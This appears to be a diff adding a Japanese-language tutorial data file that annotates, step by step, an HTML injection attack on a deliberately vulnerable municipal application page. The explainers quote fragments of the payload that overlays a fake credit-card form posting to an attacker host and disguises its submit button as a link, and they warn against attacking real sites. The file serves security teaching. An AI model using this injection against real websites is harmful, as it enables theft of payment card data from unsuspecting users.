@@ -1,0 +1,269 @@
+{
+    "index": 1,
+    "fileName": "trap.php",
+    "explainers": [
+        {
+            "questionIndices": [
+                
+            ],
+            "focusLabels": [],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "これが実際に先ほど見た脆弱なWebサイトに攻撃を仕掛けるページです。\n今回は、粗大ゴミの回収費用をクレジットカードで支払うための申し込み用Webページに改ざんしようとしています。",
+                    "languages": []
+                },
+                {
+                    "text": "なお、実際にこれから書くようなコードを用いて実在するWebサイトを攻撃するようなことは絶対にしないでください",
+                    "languages": []
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": ["<form method=\"post\" action=\"http://www.unsafe.co.jp/apply.php\">"],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "先ほどの脆弱なWebサイトではPOSTリクエストを用いていたため、この赤枠で囲まれた部分で遷移先を指定しつつ、methodをpostに設定しています。",
+                    "languages": []
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "<input type=\"hidden\" name=\"name\" value='"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分で、先ほどコードを書いた箇所で表示するnameの値を設定しています。",
+                    "languages": []
+                },
+                {
+                    "text": "typeがhiddenになっているのはユーザからこの入力欄を隠すためですが、また改めて詳しく解説します。\n「value=」の後に区切り文字として「'」を使っているのは、nameに設定する値の中で「\"」を用いているためです。",
+                    "languages": []
+                },
+                {
+                    "text": "それでは、このnameに設定する値を詳しく見ていきましょう。",
+                    "languages": []
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "\"></form>"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分で、脆弱なWebサイトに元々記述されていた<form>タグを終了させます。\nこれによって、この後に続く文字列は完全に独立したタグとすることができます。",
+                    "languages": ["html"]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "<form method=\"post\" action=\"http://www.trap.co.jp/send_mail.php\""
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分で新たな<form>タグを追加しています。\nさらにこの<form>タグの中でユーザのクレジットカード情報を盗もうとしているので、その送信先としてsend_mail.phpを指定しています。",
+                    "languages": [
+                        "html"
+                    ]
+                },
+                {
+                    "text": "このsend_mail.phpについては後ほど解説します。",
+                    "languages": [
+                    ]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "style=\""
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分から<form>要素のstyleを設定していきます。",
+                    "languages": [
+                        "html"
+                    ]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "position:absolute;top:5px;left:5px;"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分で脆弱なWebサイトで元々記述されている要素の上に、この新たに追加した<form>要素を重ねる処理を記述しています。",
+                    "languages": ["html"]
+                },
+                {
+                    "text": "脆弱なWebサイトに元々記述されていた「<h1>脆弱市 粗大ゴミ申し込みページ</h1>」という見出しも今回は別のものに改ざんし、クレジットカードの情報を入力するWebページに見せかけるため、左上に設定し元々のWebページ全体を覆うようにしています。",
+                    "languages": ["html"]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "background-color:white;"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "場所を左上に設定するだけでは、新たに追加した<form>要素の後ろに元々配置されていた<form>要素が見えてしまいます。\nそこで、この赤枠で囲まれた部分で背景色を白に設定することで元々配置されていた<form>要素を塗り潰すようにしてユーザから見えないようにしています。",
+                    "languages": [
+                        "html"
+                    ]
+                },
+                {
+                    "text": "白を設定している理由は、脆弱なWebサイトの背景色がデフォルトのまま変更されておらず白になっているためです。",
+                    "languages": [
+                    ]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "<h1>脆弱市の粗大ゴミ回収費用がクレジットカードでお支払い頂けるようになりました。</h1>"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分で新たな見出しを設定しています。\n今回は、攻撃者はユーザのクレジットカード情報を盗もうとしているためその旨に見合うような見出しが記述されています。",
+                    "languages": [
+                    ]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "カード名義: <input type=\"text\" name=\"name\">",
+                "カード番号: <input type=\"text\" name=\"card_number\">",
+                "有効期限: <input type=\"text\" name=\"expiration_date\">"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分でユーザのクレジットカード情報を入力させようとしています。",
+                    "languages": []
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "<!--"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分は、新たに追加した<form>要素の後に続く攻撃者にとって不要な要素をまとめてコメントアウトすることで非表示にし、ユーザに違和感を抱かせないために記述されています。",
+                    "languages": ["html"]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "'>"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分までが、先ほどまで見てきた<input>タグです。",
+                    "languages": ["html"]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "<input"
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分から新たに追加した<form>要素の内容を送信するための<input>要素を記述していきます。",
+                    "languages": [
+                        "html"
+                    ]
+                }
+            ]
+        },
+        {
+            "questionIndices": [],
+            "focusLabels": [
+                "style=\"cursor:pointer;text-decoration:underline;color:blue;border:none;background:transparent;font-size:100%;\""
+            ],
+            "focusComponents": [
+                []
+            ],
+            "messages": [
+                {
+                    "text": "この赤枠で囲まれた部分で送信用の<input>要素のstyleを設定しています。\nここで設定しているstyleは<input>要素を<a>要素のように見せかけるためのものです。",
+                    "languages": [
+                        "html"
+                    ]
+                },
+                {
+                    "text": "なぜ<a>要素のように見せかけるかというと、先ほどの新たな<form>要素を追加するための<input>要素はユーザに見えてしまっては怪しまれるため、typeがhiddenに設定されていました。\nつまりユーザにはこの送信用の<input>要素しか見えていません。",
+                    "languages": ["html"]
+                },
+                {
+                    "text": "それにも関わらず、この送信用の<input>要素に何もstyleを設定せずボタンのような見た目をしていると、ユーザに怪しまれてしまいます。\nそこで、<a>要素のように見せかけることで自然な形でPOSTリクエストを送ろうとしています。",
+                    "languages": [
+                        "html"
+                    ]
+                },
+                {
+                    "text": "それではなぜ最初から<a>要素を用いないのかと疑問に思われるかもしれませんが、<a>要素ではGETリクエストしか送信できないため今回は<form>と<input>を用いて値を送信する処理が記述されています。",
+                    "languages": [
+                        "html"
+                    ]
+                }
+            ]
+        }
+    ]
+}
